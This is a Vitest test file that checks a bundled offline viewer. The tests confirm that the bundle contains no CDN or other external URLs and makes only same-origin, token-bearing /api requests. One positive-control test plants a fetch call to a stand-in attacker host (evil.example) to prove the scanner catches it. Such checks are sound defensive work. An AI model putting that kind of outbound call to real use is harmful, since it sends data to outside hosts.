// MC15/design 5 "a bundled browser build with no CDN dependencies": dist/viewer (built once by test/global-setup.ts) must run
// offline. The bundle is evaluated in a bare JSDOM (scripts only via eval, no resource loading) with a recording fetch; a
// whole-bundle scan allows only XML namespace URIs. Node environment on purpose: a fresh JSDOM per test, no shared globals.
import { readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import { Script } from "node:vm";
import { JSDOM } from "jsdom";
import { describe, expect, it } from "vitest";
import { REPO_ROOT } from "../../test/helpers/fixtures.ts";

const DIST = join(REPO_ROOT, "dist", "viewer");
const ORIGIN = "http://127.0.0.1:4173";
/** Namespace identifiers the DOM APIs need as strings (createElementNS); they are never fetched. */
const ALLOWED_URI = new Set([
  "http://www.w3.org/2000/svg", "http://www.w3.org/1999/xhtml", "http://www.w3.org/1999/xlink", "http://www.w3.org/2000/xmlns/",
  "http://www.w3.org/XML/1998/namespace", "http://www.w3.org/1998/Math/MathML",
]);
export function absoluteUrls(code: string): string[] {
  return Array.from(code.matchAll(/https?:\/\/[^\s"'`<>)\\]+/g), (m) => m[0]);
}
const disallowedUrls = (code: string): string[] => absoluteUrls(code).filter((u) => !ALLOWED_URI.has(u));
const appJs = (): string => readFileSync(join(DIST, "app.js"), "utf8");

interface Boot { calls: Array<{ url: string; authorization: string | null }>; window: JSDOM["window"] & { paneweft?: { mountViewer?: unknown } }; error: unknown }
async function boot(code: string, hash: string): Promise<Boot> {
  const dom = new JSDOM('<!doctype html><html><head><meta charset="utf-8"></head><body><div id="root"></div></body></html>', {
    url: `${ORIGIN}/${hash}`, runScripts: "outside-only", pretendToBeVisual: true,
  });
  const calls: Boot["calls"] = [];
  (dom.window as unknown as { fetch: typeof fetch }).fetch = async (input, init) => {
    const url = new URL(typeof input === "string" ? input : input instanceof URL ? input.href : input.url, dom.window.location.href).href;
    const headers = new Headers(init?.headers ?? (input instanceof Request ? input.headers : undefined));
    calls.push({ url, authorization: headers.get("authorization") });
    return new Response(JSON.stringify({ schemaVersion: "paneweft.error/1", code: "NOT_FOUND", message: "stubbed", errors: [], retryable: false }), { status: 404, headers: { "content-type": "application/json" } });
  };
  let error: unknown = null;
  try { dom.window.eval(code); } catch (e) { error = e; }
  for (let i = 0; i < 10; i++) await new Promise<void>((resolve) => setImmediate(resolve)); // let a boot-time fetch chain run; no clock involved
  return { calls, window: dom.window as Boot["window"], error };
}

describe("[MC15] the shipped viewer bundle", () => {
  // why: the server serves dist/viewer; an empty or syntactically broken app.js would only be noticed in a browser.
  // proves: CLAIM(bundle-builds)
  it("[MC15] bundle: dist/viewer/app.js exists, is non-empty and compiles as a script; index.html loads exactly /assets/app.js", () => {
    expect(statSync(join(DIST, "app.js")).size).toBeGreaterThan(0);
    expect(() => new Script(appJs(), { filename: "app.js" })).not.toThrow();
    const html = readFileSync(join(DIST, "index.html"), "utf8");
    expect(Array.from(html.matchAll(/<script[^>]*\ssrc="([^"]+)"/g), (m) => m[1])).toEqual(["/assets/app.js"]);
    expect(absoluteUrls(html)).toEqual([]);
  });
  // why: design 5 "a bundled browser build with no CDN dependencies" (residual's entry imported D3 from a CDN - the failure to avoid).
  // proves: CLAIM(no-cdn)
  it("[MC15] bundle: a whole-bundle scan finds no absolute http(s) URL except XML namespace identifiers", () => {
    expect(disallowedUrls(appJs())).toEqual([]);
  });
  // why: a scanner that finds nothing proves nothing; plant a CDN URL and a namespace URI.
  // proves: CLAIM(no-cdn) (positive control)
  it("[MC15] bundle: positive control: the scanner reports a planted https://cdn.example/x.js and ignores the SVG namespace", () => {
    const planted = 'const a = "https://cdn.example/x.js"; const ns = "http://www.w3.org/2000/svg"; fetch(`http://evil.example/p?x=1`);';
    expect(absoluteUrls(planted)).toEqual(["https://cdn.example/x.js", "http://www.w3.org/2000/svg", "http://evil.example/p?x=1"]);
    expect(disallowedUrls(planted)).toEqual(["https://cdn.example/x.js", "http://evil.example/p?x=1"]);
  });
  // why: dom.md A2 - the IIFE exposes window.paneweft.mountViewer (an esbuild iife drops plain exports), without throwing.
  // proves: CLAIM(bundle-entry)
  it("[MC15] bundle: evaluating app.js in a page does not throw and defines window.paneweft.mountViewer", async () => {
    const result = await boot(appJs(), "");
    expect(result.error).toBeNull();
    expect(typeof result.window.paneweft?.mountViewer).toBe("function");
  });
  // why: design 5 "Bind loopback ... unguessable session credential": every request the booted app makes stays on the page origin
  //      and carries the bearer token read from location.hash; nothing is fetched cross-origin, nothing loads external resources.
  // proves: CLAIM(no-cdn) / CLAIM(session-credential)
  it("[MC15] bundle: booting with #token=...&view=...&snapshot=... only issues same-origin /api requests with the bearer token", async () => {
    const result = await boot(appJs(), "#token=tok123&view=v-list&snapshot=snap-1");
    expect(result.error).toBeNull();
    expect(result.calls.length).toBeGreaterThanOrEqual(1);
    for (const call of result.calls) {
      const url = new URL(call.url);
      expect(url.origin, `request ${call.url}`).toBe(ORIGIN);
      expect(url.pathname.startsWith("/api/"), `request ${call.url}`).toBe(true);
      expect(call.authorization, `request ${call.url}`).toBe("Bearer tok123");
    }
    expect(result.window.document.querySelectorAll("script[src], link[href], img[src], iframe, embed, object")).toHaveLength(0);
  });
});
